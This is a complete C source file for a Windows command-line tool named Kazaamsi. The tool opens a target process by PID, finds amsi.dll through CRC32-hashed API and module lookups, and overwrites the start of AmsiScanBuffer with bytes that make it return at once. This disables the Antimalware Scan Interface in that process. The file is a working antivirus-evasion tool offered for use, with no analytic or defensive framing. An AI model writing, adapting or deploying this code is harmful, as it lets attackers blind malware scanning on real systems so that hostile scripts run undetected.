#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include <amsi.h>
#include "structs.h"
#include "api.h"

#pragma warning(disable : 4244)

#define PATCH_BYTES "\x31\xC0\xC3"
#define PATCH_LEN 3
#define PAGE_SIZE 0x1000

BOOL g_bVerbose = FALSE;

PVOID GetRemoteModuleBase(DWORD dwPid, DWORD dwModHash, WIN32_API win32api) {
    MODULEENTRY32 ModEntry = { .dwSize = sizeof(MODULEENTRY32) };
    HANDLE hSnapshot;
    char cModName[MAX_PATH] = { 0 };
    char cUpperModName[MAX_PATH] = { 0 };
    SIZE_T sNameLen = 0;
    
    if ((hSnapshot = win32api.pCreateToolhelp32Snapshot(TH32CS_SNAPMODULE, dwPid)) == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot failed. Error: %lu\n", GetLastError());
        return NULL;
    }

    if (win32api.pModule32FirstW(hSnapshot, &ModEntry)) {
        do {
            WideCharToMultiByte(CP_ACP, 0, ModEntry.szModule, -1, cModName, MAX_PATH, NULL, NULL);
   
            for (int i = 0; i < sizeof(cModName); i++) {
                if (cModName[i] >= 'a' && cModName[i] <= 'z')
                    cUpperModName[i] = (CHAR)cModName[i] - 'a' + 'A';
                else
                    cUpperModName[i] = (CHAR)cModName[i];
            }

            if (CRC32BA(cUpperModName) == dwModHash) {

                if (g_bVerbose == TRUE)
                    printf("[*] %s base address: 0x%p\n", cModName, ModEntry.modBaseAddr);

                win32api.pCloseHandle(hSnapshot);
                return ModEntry.modBaseAddr;
            }
        } while (win32api.pModule32NextW(hSnapshot, &ModEntry));
    }
    else
        printf("[!] Module32FirstW failed. Error: %lu\n", GetLastError());
    
    win32api.pCloseHandle(hSnapshot);
    return NULL;
}

BOOL GetRemoteFuncAddress(IN DWORD dwTargetPid, IN WIN32_API win32api, OUT PVOID* ppBuffer) {
    char cDllName[] = { 'a','m','s','i','.','d','l','l', 0 };
    HMODULE hModBase = NULL;
    PBYTE pFuncAddr = NULL;
    SIZE_T sOffset = 0;
    PBYTE pRemoteModBase = NULL;
    PVOID pRemoteFuncAddr = NULL;
    BOOL bResult = FALSE;

   if (!(hModBase = win32api.pLoadLibraryA(cDllName))) {
        printf("[!] LoadLibraryA failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!(pFuncAddr = (PBYTE)GetProcAddressH(hModBase, AmsiScanBuffer_CRC32))) {
        printf("[!] GetProcAddress failed. Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    sOffset = (SIZE_T)(pFuncAddr - (PBYTE)hModBase);

    if (!(pRemoteModBase = (PBYTE)GetRemoteModuleBase(dwTargetPid, AMSI_CRC32, win32api))) {
        printf("[-] Failed to locate %s in remote process\n", cDllName);
        goto CLEANUP;
    }

    pRemoteFuncAddr = pRemoteModBase + sOffset;

    if (g_bVerbose == TRUE)
        printf("[*] AmsiScanBuffer address: 0x%p\n", pRemoteFuncAddr);

    *ppBuffer = pRemoteFuncAddr;
    bResult = TRUE;

CLEANUP:
    if (hModBase) win32api.pFreeLibrary(hModBase);
    return bResult;
}

BOOL PatchRemoteProcess(IN DWORD dwTargetPid, IN PVOID pTargetAddress, IN WIN32_API win32api) {
    HANDLE hProcess = NULL;
    char cPatchBytes[] = PATCH_BYTES;
    PVOID pPageBase = (PVOID)((ULONG_PTR)pTargetAddress & ~(PAGE_SIZE - 1));
    DWORD dwOldProtect = 0;
    BOOL bResult = FALSE;

    if (!(hProcess = win32api.pOpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, dwTargetPid))) {
        printf("[!] OpenProcess failed. Error: %lu\n", GetLastError());
        return FALSE;
    }

    if (!win32api.pVirtualProtectEx(hProcess, pPageBase, PAGE_SIZE, PAGE_READWRITE, &dwOldProtect)) {
        printf("[!] VirtualProtectEx [1] failed. Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    if (!win32api.pWriteProcessMemory(hProcess, pTargetAddress, cPatchBytes, PATCH_LEN, NULL)) {
        printf("[!] WriteProcessMemory failed. Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    if (!win32api.pVirtualProtectEx(hProcess, pPageBase, PAGE_SIZE, dwOldProtect, &dwOldProtect)) {
        printf("[!] VirtualProtectEx [2] failed. Error: %lu\n", GetLastError());
        goto CLEANUP;
    }

    printf("[*] Process successfully patched\n");
    bResult = TRUE;

CLEANUP:
    if (hProcess) win32api.pCloseHandle(hProcess);
    return bResult;
}


BOOL ParseArguments(int argc, char** argv, OUT DWORD* pdwPid, OUT BOOL* pVerbose) {
    if (argc < 2 || argc > 3) {
        printf("Usage: Kazaamsi.exe <PID> [-v]\n");
        return FALSE;
    }

    if ((*pdwPid = strtoul(argv[1], NULL, 10)) == 0) {
        printf("[!] Invalid PID: %s\n", argv[1]);
        return FALSE;
    }

    *pVerbose = (argc == 3 && strcmp(argv[2], "-v") == 0);
    return TRUE;
}

int main(int argc, char** argv) {
    WIN32_API Win32Api = { 0 };
    DWORD dwRemotePid = 0;
    PVOID pRemoteAddress = NULL;

    if (!ParseArguments(argc, argv, &dwRemotePid, &g_bVerbose))
        return EXIT_FAILURE;

    if (!InitializeWin32Api(&Win32Api)) 
        return EXIT_FAILURE;
    
    if (!GetRemoteFuncAddress(dwRemotePid, Win32Api, &pRemoteAddress)) 
        return EXIT_FAILURE;
    
    if (!PatchRemoteProcess(dwRemotePid, pRemoteAddress, Win32Api)) 
        return EXIT_FAILURE;
    
    return EXIT_SUCCESS;
}
